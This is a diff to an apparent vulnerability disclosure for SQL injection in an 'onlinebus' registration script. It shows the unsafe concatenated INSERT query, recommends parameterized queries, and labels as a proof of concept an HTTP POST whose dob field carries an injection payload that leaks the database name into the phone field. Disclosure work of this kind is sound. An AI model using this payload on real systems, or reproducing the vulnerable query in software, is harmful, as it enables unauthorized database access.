@@ -42,9 +42,10 @@ in register_insert.php ，	have CWE-564: SQL Injection: Hibernate
 ```
 $sql_userdatabase="Insert into userdatabase(Name ,Email , Gender, password , dob , Phone) values ('$name' , '$email' , '$Gender', '$password', '$dob', '$Phone')";
 ```
-
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
 
+
+POC:
 ```
 POST /register_insert.php HTTP/1.1
 Host: onlinebus
@@ -68,6 +69,7 @@ name=zihe&email=q%40qq.com&Gender=M&dob=2002-02-02', database()) -- -&password=1
 
 ![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/1579ba61-24ed-4e57-8445-f004e97042fc)
 
+phone changed to database name
 
 
 
